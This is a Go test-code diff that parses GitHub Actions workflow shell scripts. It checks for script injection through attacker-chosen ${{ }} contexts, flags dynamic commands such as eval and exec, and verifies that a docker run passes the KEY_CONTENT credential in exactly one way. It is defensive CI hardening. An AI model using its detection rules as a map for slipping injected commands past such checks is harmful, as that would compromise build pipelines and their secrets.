+			argument != "[" && argument != "]" && strings.Contains(argument, "[") && strings.Contains(argument, "]") {
+
+			return true
+		}
+	}
+	return false
+}
+
+func isShellAssignment(word string) bool {
+	separator := strings.IndexByte(word, '=')
+	if separator < 1 {
+		return false
+	}
+	for index, character := range word[:separator] {
+		if (character < 'a' || character > 'z') && (character < 'A' || character > 'Z') && character != '_' &&
+			(index == 0 || character < '0' || character > '9') {
+
+			return false
+		}
+	}
+	return true
+}
+
+func hasUnsupportedDynamicCommand(arguments []string) bool {
+	timePrefix := false
+	skipRedirectionTarget := false
+	for _, argument := range arguments {
+		if skipRedirectionTarget {
+			skipRedirectionTarget = false
+			continue
+		}
+		switch argument {
+		case "", "!", "{", "}", "if", "then", "elif", "else", "for", "while", "until", "do":
+			continue
+		case "time":
+			timePrefix = true
+			continue
+		case "builtin", "command", "env", "eval", "exec", "source", ".", "trap":
+			return true
+		}
+		if isShellAssignment(argument) {
+			continue
+		}
+		if isShellRedirection(argument) {
+			skipRedirectionTarget = shellRedirectionNeedsTarget(argument)
+			continue
+		}
+		if timePrefix && strings.HasPrefix(argument, "-") {
+			continue
+		}
+		return strings.ContainsAny(argument, "$`")
+	}
+	return false
+}
+
+func shellCommandIndex(arguments []string) int {
+	timePrefix := false
+	skipRedirectionTarget := false
+	for index, argument := range arguments {
+		if skipRedirectionTarget {
+			skipRedirectionTarget = false
+			continue
+		}
+		switch argument {
+		case "", "!", "{", "}", "if", "then", "elif", "else", "for", "while", "until", "do":
+			continue
+		case "time":
+			timePrefix = true
+			continue
+		}
+		if isShellAssignment(argument) {
+			continue
+		}
+		if isShellRedirection(argument) {
+			skipRedirectionTarget = shellRedirectionNeedsTarget(argument)
+			continue
+		}
+		if timePrefix && strings.HasPrefix(argument, "-") {
+			continue
+		}
+		return index
+	}
+	return -1
+}
+
+func isShellRedirection(word string) bool {
+	operator := strings.TrimLeft(word, "0123456789")
+	return strings.HasPrefix(operator, "<") || strings.HasPrefix(operator, ">") ||
+		strings.HasPrefix(operator, "&>")
+}
+
+func shellRedirectionNeedsTarget(word string) bool {
+	operator := strings.TrimLeft(word, "0123456789")
+	switch operator {
+	case "<", ">", "<<", "<<-", ">>", "<<<", "<>", ">|", "<&", ">&", "&>", "&>>":
+		return true
+	default:
+		return false
+	}
+}
+
+func activeRunLineContainsAll(run string, markers ...string) bool {
+	lines, err := executableShellLines(run)
+	if err != nil {
+		return false
+	}
+	return executableLinesContainAll(lines, markers...)
+}
+
+func executableLinesContainAll(lines []string, markers ...string) bool {
+	for _, line := range lines {
+		line = strings.TrimSpace(line)
+		matches := true
+		for _, marker := range markers {
+			if !strings.Contains(line, marker) {
+				matches = false
+				break
+			}
+		}
+		if matches {
+			return true
+		}
+	}
+	return false
+}
+
+func activeRunInvokesExactCommand(run, expected string) bool {
+	lines, err := executableShellLines(run)
+	if err != nil {
+		return false
+	}
+	for _, line := range lines {
+		line = strings.TrimSpace(line)
+		line = strings.TrimSpace(strings.TrimSuffix(line, "; then"))
+		line = strings.TrimSpace(strings.TrimPrefix(line, "if "))
+		if line == expected {
+			return true
+		}
+	}
+	return false
+}
+
+func activeDockerRunMatches(run, expectedCommand, expectedEnvironment string) bool {
+	commands, err := logicalShellLines(run)
+	if err != nil {
+		return false
+	}
+	expectedArguments, err := shellWords(expectedCommand)
+	if err != nil || len(expectedArguments) == 0 {
+		return false
+	}
+	environments, err := shellWords(expectedEnvironment)
+	if err != nil || len(environments) != 1 {
+		return false
+	}
+	dockerRuns := 0
+	allMatch := true
+	for _, command := range commands {
+		command = strings.TrimSpace(strings.TrimSuffix(command, "; then"))
+		command = strings.TrimSpace(strings.TrimPrefix(command, "if "))
+		arguments, parseErr := shellWords(command)
+		if parseErr != nil {
+			if strings.Contains(command, "docker run") {
+				dockerRuns++
+				allMatch = false
+			}
+			continue
+		}
+		if hasUnsupportedDynamicShellWord(arguments, true) {
+			allMatch = false
+			continue
+		}
+		if hasUnsupportedDynamicCommand(arguments) {
+			allMatch = false
+			continue
+		}
+		containsDockerRun := shellArgumentsContainDockerRun(arguments)
+		containsCredential := shellArgumentsContain(arguments, "KEY_CONTENT")
+		if !containsDockerRun && !containsCredential {
+			continue
+		}
+		if !containsDockerRun {
+			allMatch = false
+			continue
+		}
+		dockerRuns++
+		if len(arguments) < 3 || arguments[0] != "/usr/bin/docker" || arguments[1] != "run" {
+			allMatch = false
+			continue
+		}
+
+		credentialEnvironments := 0
+		environmentMatches := true
+		checkEnvironment := func(value string) {
+			if value != "KEY_CONTENT" && !strings.HasPrefix(value, "KEY_CONTENT=") {
+				return
+			}
+			credentialEnvironments++
+			environmentMatches = environmentMatches && value == environments[0]
+		}
+		index := 2
+		validOptions := true
+		for index < len(arguments) && strings.HasPrefix(arguments[index], "-") {
+			option := arguments[index]
+			switch {
+			case option == "-e" || option == "--env":
+				if index+1 >= len(arguments) {
+					validOptions = false
+					index++
+					continue
+				}
+				checkEnvironment(arguments[index+1])
+				index += 2
+			case strings.HasPrefix(option, "--env="):
+				checkEnvironment(strings.TrimPrefix(option, "--env="))
+				index++
+			case strings.HasPrefix(option, "-e="):
+				checkEnvironment(strings.TrimPrefix(option, "-e="))
+				index++
+			case strings.HasPrefix(option, "-e") && len(option) > len("-e"):
+				checkEnvironment(strings.TrimPrefix(option, "-e"))
+				index++
+			default:
+				validOptions = false
+				index++
+			}
+		}
+		if !validOptions || credentialEnvironments != 1 || !environmentMatches ||
+			len(arguments)-index != len(expectedArguments) {
+
+			allMatch = false
+			continue
+		}
+		matches := true
+		for offset, expected := range expectedArguments {
+			if arguments[index+offset] != expected {
+				matches = false
+				break
+			}
+		}
+		if !matches {
+			allMatch = false
+		}
+	}
+	return dockerRuns == 1 && allMatch
+}
+
+func shellWords(command string) ([]string, error) {
+	words := make([]string, 0)
+	var word strings.Builder
+	var quote byte
+	escaped := false
+	started := false
+	flush := func() {
+		if started {
+			words = append(words, word.String())
+			word.Reset()
+			started = false
+		}
+	}
+
+	for index := 0; index < len(command); index++ {
+		character := command[index]
+		if escaped {
+			word.WriteByte(character)
+			escaped = false
+			started = true
+			continue
+		}
+		if quote == '\'' {
+			if character == '\'' {
+				quote = 0
+			} else {
+				word.WriteByte(character)
+			}
+			started = true
+			continue
+		}
+		if quote == '"' {
+			switch character {
+			case '"':
+				quote = 0
+			case '\\':
+				if index+1 < len(command) && strings.ContainsRune("$`\"\\\n", rune(command[index+1])) {
+					escaped = true
+				} else {
+					word.WriteByte(character)
+				}
+			default:
+				word.WriteByte(character)
+			}
+			started = true
+			continue
+		}
+		if strings.HasPrefix(command[index:], "${{") {
+			end := strings.Index(command[index+3:], "}}")
+			if end < 0 {
+				return nil, fmt.Errorf("unterminated GitHub expression")
+			}
+			end += index + 5
+			word.WriteString(command[index:end])
+			started = true
+			index = end - 1
+			continue
+		}
+		if strings.HasPrefix(command[index:], "$'") {
+			decoded, next, err := decodeANSICQuoted(command, index)
+			if err != nil {
+				return nil, fmt.Errorf("parse ANSI-C quote: %w", err)
+			}
+			word.WriteString(decoded)
+			started = true
+			index = next - 1
+			continue
+		}
+		if strings.HasPrefix(command[index:], `$"`) {
+			return nil, fmt.Errorf("locale shell quoting is unsupported")
+		}
+
+		switch {
+		case character == '\'' || character == '"':
+			quote = character
+			started = true
+		case character == '\\':
+			escaped = true
+			started = true
+		case unicode.IsSpace(rune(character)):
+			flush()
+		default:
+			word.WriteByte(character)
+			started = true
+		}
+	}
+	if quote != 0 || escaped {
+		return nil, fmt.Errorf("unterminated shell word")
+	}
+	flush()
+	return words, nil
+}
+
+func decodeANSICQuoted(command string, start int) (string, int, error) {
+	var decoded strings.Builder
+	for index := start + 2; index < len(command); index++ {
+		character := command[index]
+		if character == '\'' {
+			return decoded.String(), index + 1, nil
+		}
+		if character != '\\' {
+			decoded.WriteByte(character)
+			continue
+		}
+
+		index++
+		if index >= len(command) {
+			return "", 0, fmt.Errorf("unterminated escape")
+		}
+		escape := command[index]
+		switch escape {
+		case 'a':
+			decoded.WriteByte('\a')
+		case 'b':
+			decoded.WriteByte('\b')
+		case 'e', 'E':
+			decoded.WriteByte(0x1b)
+		case 'f':
+			decoded.WriteByte('\f')
+		case 'n':
+			decoded.WriteByte('\n')
+		case 'r':
+			decoded.WriteByte('\r')
+		case 't':
+			decoded.WriteByte('\t')
+		case 'v':
+			decoded.WriteByte('\v')
+		case '\\', '\'', '"', '?':
+			decoded.WriteByte(escape)
+		case '\n':
+			continue
+		case 'x':
+			value, consumed := parseANSIDigits(command[index+1:], 16, 2)
+			if consumed == 0 {
+				return "", 0, fmt.Errorf("hex escape requires one or two digits")
+			}
+			if value == 0 {
+				return "", 0, fmt.Errorf("NUL escape is unsupported")
+			}
+			decoded.WriteByte(byte(value))
+			index += consumed
+		case 'u', 'U':
+			maximumDigits := 4
+			if escape == 'U' {
+				maximumDigits = 8
+			}
+			value, consumed := parseANSIDigits(command[index+1:], 16, maximumDigits)
+			if consumed == 0 {
+				return "", 0, fmt.Errorf("Unicode escape requires hexadecimal digits")
+			}
+			if value == 0 || value > 0x10ffff || value >= 0xd800 && value <= 0xdfff {
+				return "", 0, fmt.Errorf("Unicode escape is not a valid non-NUL scalar")
+			}
+			decoded.WriteRune(rune(value))
+			index += consumed
+		case '0', '1', '2', '3', '4', '5', '6', '7':
+			value, consumed := parseANSIDigits(command[index:], 8, 3)
+			if value == 0 || value > 0xff {
+				return "", 0, fmt.Errorf("octal escape is not a valid non-NUL byte")
+			}
+			decoded.WriteByte(byte(value))
+			index += consumed - 1
+		case 'c':
+			if index+1 >= len(command) || command[index+1] == '\'' {
+				return "", 0, fmt.Errorf("control escape requires one ASCII character")
+			}
+			index++
+			control := command[index]
+			if control > 0x7f {
+				return "", 0, fmt.Errorf("control escape requires one ASCII character")
+			}
+			value := control & 0x1f
+			if control == '?' {
+				value = 0x7f
+			}
+			if value == 0 {
+				return "", 0, fmt.Errorf("NUL escape is unsupported")
+			}
+			decoded.WriteByte(value)
+		default:
+			return "", 0, fmt.Errorf("unsupported escape \\%c", escape)
+		}
+	}
+	return "", 0, fmt.Errorf("unterminated quote")
+}
+
+func parseANSIDigits(value string, base, maximum int) (int, int) {
+	result := 0
+	consumed := 0
+	for consumed < len(value) && consumed < maximum {
+		digit := ansiDigitValue(value[consumed])
+		if digit < 0 || digit >= base {
+			break
+		}
+		result = result*base + digit
+		consumed++
+	}
+	return result, consumed
+}
+
+func ansiDigitValue(value byte) int {
+	switch {
+	case value >= '0' && value <= '9':
+		return int(value - '0')
+	case value >= 'a' && value <= 'f':
+		return int(value-'a') + 10
+	case value >= 'A' && value <= 'F':
+		return int(value-'A') + 10
+	default:
+		return -1
+	}
+}
+
+type shellHeredoc struct {
+	delimiter string
+	stripTabs bool
+}
+
+func executableShellLines(script string) ([]string, error) {
+	lines := make([]string, 0)
+	pending := make([]shellHeredoc, 0)
+	for lineNumber, raw := range strings.Split(script, "\n") {
+		if len(pending) > 0 {
+			candidate := raw
+			if pending[0].stripTabs {
+				candidate = strings.TrimLeft(candidate, "\t")
+			}
+			if candidate == pending[0].delimiter {
+				pending = pending[1:]
+			}
+			continue
+		}
+
+		line, err := stripShellComment(raw)
+		if err != nil {
+			return nil, fmt.Errorf("line %d: %w", lineNumber+1, err)
+		}
+		if shellLineContinues(line) && (len(line) < 2 || !unicode.IsSpace(rune(line[len(line)-2]))) {
+			return nil, fmt.Errorf("line %d: continuation inside a shell token is unsupported", lineNumber+1)
+		}
+		if strings.Contains(line, "((") {
+			return nil, fmt.Errorf("line %d: shell arithmetic is unsupported", lineNumber+1)
+		}
+		heredocs := shellHeredocs(line)
+		if len(heredocs) > 0 && shellLineContinues(line) {
+			return nil, fmt.Errorf("line %d: heredoc with line continuation is unsupported", lineNumber+1)
+		}
+		if strings.TrimSpace(line) != "" {
+			lines = append(lines, line)
+		}
+		pending = append(pending, heredocs...)
+	}
+	if len(pending) > 0 {
+		return nil, fmt.Errorf("unterminated heredoc %q", pending[0].delimiter)
+	}
+	return lines, nil
+}
+
+func stripShellComment(line string) (string, error) {
+	var quote byte
+	escaped := false
+	wordStart := true
+	for index := 0; index < len(line); index++ {
+		character := line[index]
+		if escaped {
+			escaped = false
+			wordStart = false
+			continue
+		}
+		if quote == '\'' {
+			if character == '\'' {
+				quote = 0
+			}
+			continue
+		}
+		if quote == '"' {
+			switch character {
+			case '"':
+				quote = 0
+			case '\\':
+				escaped = true
+			}
+			continue
+		}
+
+		switch {
+		case character == '\\':
+			escaped = true
+			wordStart = false
+		case character == '\'' || character == '"':
+			quote = character
+			wordStart = false
+		case character == '#' && wordStart:
+			return line[:index], nil
+		default:
+			wordStart = unicode.IsSpace(rune(character)) || strings.ContainsRune(`;|&()<>`, rune(character))
+		}
+	}
+	if quote != 0 {
+		return "", fmt.Errorf("unterminated shell quote")
+	}
+	return line, nil
+}
+
+func shellHeredocs(line string) []shellHeredoc {
+	heredocs := make([]shellHeredoc, 0)
+	var quote byte
+	escaped := false
+	for index := 0; index < len(line); index++ {
+		character := line[index]
+		if escaped {
+			escaped = false
+			continue
+		}
+		if quote != 0 {
+			if character == quote {
+				quote = 0
+			} else if quote == '"' && character == '\\' {
+				escaped = true
+			}
+			continue
+		}
+		if character == '\\' {
+			escaped = true
+			continue
+		}
+		if character == '\'' || character == '"' {
+			quote = character
+			continue
+		}
+		if character != '<' || index+1 >= len(line) || line[index+1] != '<' {
+			continue
+		}
+		if index+2 < len(line) && line[index+2] == '<' {
+			index += 2
+			continue
+		}
+
+		cursor := index + 2
+		stripTabs := false
+		if cursor < len(line) && line[cursor] == '-' {
+			stripTabs = true
+			cursor++
+		}
+		for cursor < len(line) && (line[cursor] == ' ' || line[cursor] == '\t') {
+			cursor++
+		}
+		delimiter, next, ok := readHeredocDelimiter(line, cursor)
+		if ok {
+			heredocs = append(heredocs, shellHeredoc{delimiter: delimiter, stripTabs: stripTabs})
+			index = next - 1
+		}
+	}
+	return heredocs
+}
+
+func readHeredocDelimiter(line string, start int) (string, int, bool) {
+	var delimiter strings.Builder
+	var quote byte
+	escaped := false
+	started := false
+	index := start
+	for ; index < len(line); index++ {
+		character := line[index]
+		if escaped {
+			delimiter.WriteByte(character)
+			escaped = false
+			started = true
+			continue
+		}
+		if quote != 0 {
+			switch {
+			case character == quote:
+				quote = 0
+			case quote == '"' && character == '\\':
+				if index+1 < len(line) && strings.ContainsRune("$`\"\\\n", rune(line[index+1])) {
+					escaped = true
+				} else {
+					delimiter.WriteByte(character)
+				}
+			default:
+				delimiter.WriteByte(character)
+			}
+			started = true
+			continue
+		}
+		if character == '\'' || character == '"' {
+			quote = character
+			started = true
+			continue
+		}
+		if character == '\\' {
+			escaped = true
+			started = true
+			continue
+		}
+		if unicode.IsSpace(rune(character)) || strings.ContainsRune(`;|&()<>`, rune(character)) {
+			break
+		}
+		delimiter.WriteByte(character)
+		started = true
+	}
+	return delimiter.String(), index, started
+}
+
+func shellLineContinues(line string) bool {
+	if len(line) == 0 || line[len(line)-1] != '\\' {
+		return false
+	}
+	backslashes := 0
+	for index := len(line) - 1; index >= 0 && line[index] == '\\'; index-- {
+		backslashes++
+	}
+	return backslashes%2 == 1
+}
+
+func logicalShellLines(script string) ([]string, error) {
+	lines, err := executableShellLines(script)
+	if err != nil {
+		return nil, fmt.Errorf("parse executable shell lines: %w", err)
+	}
+	commands := make([]string, 0)
+	var logical strings.Builder
+	for _, line := range lines {
+		continued := shellLineContinues(line)
+		line = strings.TrimSpace(line)
+		if continued {
+			line = strings.TrimSpace(strings.TrimSuffix(line, `\`))
+		}
+		if logical.Len() > 0 && line != "" {
+			logical.WriteByte(' ')
+		}
+		logical.WriteString(line)
+		if continued {
+			continue
+		}
+		commands = append(commands, logical.String())
+		logical.Reset()
+	}
+	if logical.Len() > 0 {
+		return nil, fmt.Errorf("unterminated shell line continuation")
+	}
+	return commands, nil
+}
+
+func loadWorkflow(t *testing.T, file string) *yaml.Node {
+	t.Helper()
+	path := filepath.Clean(filepath.Join(workflowsDir, file))
+	data, err := os.ReadFile(path)
+	if err != nil {
+		t.Fatalf("read %s: %v", path, err)
+	}
+
+	var node yaml.Node
+	if err := yaml.Unmarshal(data, &node); err != nil {
+		t.Fatalf("parse %s: %v", path, err)
+	}
+	return &node
+}
+
+func walkStringScalars(node *yaml.Node, visit func(string)) {
+	if node.Kind == yaml.ScalarNode && node.Tag == "!!str" {
+		visit(node.Value)
+	}
+	for _, child := range node.Content {
+		walkStringScalars(child, visit)
+	}
+}
+
+// slsaPredicateStep returns the single step of the SLSA predicate action that
+// writes the predicate file.
+func slsaPredicateStep(t *testing.T) workflowStep {
+	t.Helper()
+	path := filepath.Clean(filepath.Join(actionsDir, slsaPredicateAction))
+	data, err := os.ReadFile(path)
+	if err != nil {
+		t.Fatalf("read %s: %v", path, err)
+	}
+	var action struct {
+		Runs struct {
+			Steps []workflowStep `yaml:"steps"`
+		} `yaml:"runs"`
+	}
+	if err := yaml.Unmarshal(data, &action); err != nil {
+		t.Fatalf("parse %s: %v", path, err)
+	}
+	matches := make([]workflowStep, 0, 1)
+	for _, step := range action.Runs.Steps {
+		if strings.Contains(step.Run, slsaPredicateMarker) {
+			matches = append(matches, step)
+		}
+	}
+	if len(matches) != 1 {
+		t.Fatalf("found %d steps writing %q in %s, want exactly one",
+			len(matches), slsaPredicateMarker, path)
+	}
+	return matches[0]
+}
+
+// renderSLSAPredicate reproduces what the runner does to the step: substitute
+// every ${{ }} into the env values and into the run text, export the env, and
+// execute the script. Only the part of the script that terminates the predicate
+// heredoc is run; the tail fetches a Sigstore signing config over the network.
+func renderSLSAPredicate(t *testing.T, step workflowStep, ref string) []byte {
+	t.Helper()
+	values := map[string]string{
+		"github.repository":    slsaPredicateRepository,
+		"github.ref":           ref,
+		"github.sha":           slsaPredicateSHA,
+		"github.run_id":        slsaPredicateRunID,
+		"inputs.workflow_file": slsaPredicateWorkflowFile,
+	}
+
+	directory := t.TempDir()
+	environment := append(os.Environ(), "RUNNER_TEMP="+directory)
+	for name, value := range step.Env {
+		environment = append(environment, name+"="+substituteExpressions(t, value, values))
+	}
+
+	script, err := heredocTerminatedPrefix(substituteExpressions(t, step.Run, values))
+	if err != nil {
+		t.Fatalf("locate the predicate heredoc: %v", err)
+	}
+	scriptPath := filepath.Join(directory, "predicate.sh")
+	if writeErr := os.WriteFile(scriptPath, []byte(script), 0o600); writeErr != nil {
+		t.Fatalf("write the rendered script: %v", writeErr)
+	}
+
+	command := exec.Command("bash", scriptPath)
+	command.Env = environment
+	if output, runErr := command.CombinedOutput(); runErr != nil {
+		t.Fatalf("run the rendered predicate script: %v\n%s", runErr, output)
+	}
+	predicate, err := os.ReadFile(filepath.Join(directory, "slsa-predicate.json"))
+	if err != nil {
+		t.Fatalf("read the emitted predicate: %v", err)
+	}
+	return predicate
+}
+
+// substituteExpressions replaces every ${{ }} with its test value, the textual
+// substitution the runner performs before bash parses the script. An expression
+// with no test value is fatal rather than skipped, so a context added later
+// cannot quietly drop out of the rendered script.
+func substituteExpressions(t *testing.T, text string, values map[string]string) string {
+	t.Helper()
+	var rendered strings.Builder
+	cursor := 0
+	for {
+		start := strings.Index(text[cursor:], expressionOpen)
+		if start < 0 {
+			rendered.WriteString(text[cursor:])
+			return rendered.String()
+		}
+		start += cursor
+		end := strings.Index(text[start+len(expressionOpen):], expressionClose)
+		if end < 0 {
+			t.Fatalf("unterminated expression in %q", text[start:])
+		}
+		body := strings.TrimSpace(text[start+len(expressionOpen) : start+len(expressionOpen)+end])
+		value, known := values[body]
+		if !known {
+			t.Fatalf("expression ${{ %s }} has no test value; add one so the rendered script "+
+				"stays faithful to what the runner produces", body)
+		}
+		rendered.WriteString(text[cursor:start])
+		rendered.WriteString(value)
+		cursor = start + len(expressionOpen) + end + len(expressionClose)
+	}
+}
+
+// heredocTerminatedPrefix returns the leading part of a script up to and
+// including the line that closes its first heredoc. Splitting on the heredoc
+// structure rather than on a chosen line of text means the boundary survives an
+// edit to the script's tail.
+func heredocTerminatedPrefix(script string) (string, error) {
+	lines := strings.Split(script, "\n")
+	pending := make([]shellHeredoc, 0)
+	opened := false
+	for number, raw := range lines {
+		if len(pending) > 0 {
+			candidate := raw
+			if pending[0].stripTabs {
+				candidate = strings.TrimLeft(candidate, "\t")
+			}
+			if candidate == pending[0].delimiter {
+				pending = pending[1:]
+			}
+			if len(pending) == 0 {
+				return strings.Join(lines[:number+1], "\n") + "\n", nil
+			}
+			continue
+		}
+		line, err := stripShellComment(raw)
+		if err != nil {
+			return "", fmt.Errorf("line %d: %w", number+1, err)
+		}
+		heredocs := shellHeredocs(line)
+		if len(heredocs) > 0 {
+			opened = true
+		}
+		pending = append(pending, heredocs...)
+	}
+	if opened {
+		return "", fmt.Errorf("unterminated heredoc %q", pending[0].delimiter)
+	}
+	return "", fmt.Errorf("the script opens no heredoc")
+}
+
+// actionsExpressions returns the body of every ${{ }} in text. The closing
+// delimiter is matched as a pair, so an expression containing a format()
+// placeholder such as '{0}' is returned whole rather than cut at its first brace.
+func actionsExpressions(text string) []string {
+	expressions := make([]string, 0)
+	cursor := 0
+	for {
+		start := strings.Index(text[cursor:], expressionOpen)
+		if start < 0 {
+			return expressions
+		}
+		start += cursor
+		end := strings.Index(text[start+len(expressionOpen):], expressionClose)
+		if end < 0 {
+			return expressions
+		}
+		expressions = append(expressions, text[start+len(expressionOpen):start+len(expressionOpen)+end])
+		cursor = start + len(expressionOpen) + end + len(expressionClose)
+	}
+}
+
+// expressionContexts returns the dotted context paths an Actions expression
+// references. An index segment that follows a path, ['key'], is read as .key,
+// since Actions treats the two alike. Any other index after a path is computed
+// at evaluation time, so the path is returned with computedIndexMarker instead
+// of a guessed key. An index on a function result has no path to carry the
+// marker, so the marker is returned on its own. Other single-quoted literals are
+// skipped so a format() template does not contribute its own text as an
+// identifier.
+func expressionContexts(expression string) []string {
+	contexts := make([]string, 0)
+	var current strings.Builder
+	quoted := false
+	flush := func() {
+		if path := strings.Trim(current.String(), "."); path != "" {
+			contexts = append(contexts, path)
+		}
+		current.Reset()
+	}
+	for index := 0; index < len(expression); index++ {
+		character := expression[index]
+		if quoted {
+			if character == '\'' {
+				quoted = false
+			}
+			continue
+		}
+		if current.Len() > 0 {
+			if key, end, ok := expressionIndexSegment(expression, index); ok {
+				current.WriteString("." + key)
+				index = end
+				continue
+			}
+			if expressionOpensIndex(expression, index) {
+				current.WriteString(computedIndexMarker)
+				flush()
+			}
+		}
+		switch {
+		case character == '\'':
+			flush()
+			quoted = true
+		case character == ')':
+			flush()
+			if expressionOpensIndex(expression, index+1) {
+				contexts = append(contexts, computedIndexMarker)
+			}
+		case character == '.' || character == '_' || character == '-' ||
+			character >= 'a' && character <= 'z' ||
+			character >= 'A' && character <= 'Z' ||
+			character >= '0' && character <= '9':
+			current.WriteByte(character)
+		default:
+			flush()
+		}
+	}
+	flush()
+	return contexts
+}
+
+// expressionIndexSegment reads a property dereference by index, ['key'], at
+// expression[start:], allowing blanks before and inside the brackets. It returns
+// the key and the offset of the closing bracket. A key holding an escaped quote,
+// written as two single quotes, is not recognized, so the caller reads those
+// brackets as punctuation.
+func expressionIndexSegment(expression string, start int) (string, int, bool) {
+	skipBlanks := func(offset int) int {
+		return len(expression) - len(strings.TrimLeft(expression[offset:], " \t\r\n"))
+	}
+	open := skipBlanks(start)
+	if open == len(expression) || expression[open] != '[' {
+		return "", 0, false
+	}
+	quote := skipBlanks(open + 1)
+	if quote == len(expression) || expression[quote] != '\'' {
+		return "", 0, false
+	}
+	length := strings.IndexByte(expression[quote+1:], '\'')
+	if length < 0 {
+		return "", 0, false
+	}
+	closing := skipBlanks(quote + length + 2)
+	if closing == len(expression) || expression[closing] != ']' {
+		return "", 0, false
+	}
+	return expression[quote+1 : quote+1+length], closing, true
+}
+
+// expressionOpensIndex reports whether expression[start:], after any blanks,
+// begins with an index bracket.
+func expressionOpensIndex(expression string, start int) bool {
+	return strings.HasPrefix(strings.TrimLeft(expression[start:], " \t\r\n"), "[")
+}
+
+// isAttackerChosenContext reports whether an expression referencing context
+// carries text an outsider chooses. github.repository and github.sha are
+// deliberately absent: GitHub constrains a repository name to [A-Za-z0-9._-]
+// and a sha to hex, so neither can carry a shell metacharacter. envKeys extends
+// the judgement one hop, to a workflow/job/step env entry that is itself defined
+// from such a context, which is the shape a partial revert would take. A path
+// carrying computedIndexMarker counts as attacker-chosen whatever its root: the
+// property it reads is not known until the expression is evaluated.
+func isAttackerChosenContext(context string, envKeys map[string]bool) bool {
+	if slices.Contains(attackerChosenContexts, context) ||
+		strings.HasSuffix(context, computedIndexMarker) {
+
+		return true
+	}
+	if context == strings.TrimSuffix(eventContextPrefix, ".") ||
+		strings.HasPrefix(context, eventContextPrefix) {
+
+		return true
+	}
+	name, viaEnv := strings.CutPrefix(context, "env.")
+	return viaEnv && envKeys[name]
+}
+
+// attackerChosenEnvKeys returns the names of the env entries defined from an
+// attacker-chosen context. Defining one is the CORRECT shape: the value is
+// exported, and a shell reading it back as $VAR expands it without re-scanning
+// it for command substitution.
+func attackerChosenEnvKeys(environments ...map[string]string) map[string]bool {
+	keys := make(map[string]bool)
+	for _, environment := range environments {
+		for name, value := range environment {
+			for _, expression := range actionsExpressions(value) {
+				for _, context := range expressionContexts(expression) {
+					// nil: the hop is one level deep, an env entry defined
+					// from another env entry is not followed.
+					if isAttackerChosenContext(context, nil) {
+						keys[name] = true
+					}
+				}
+			}
+		}
+	}
+	return keys
+}
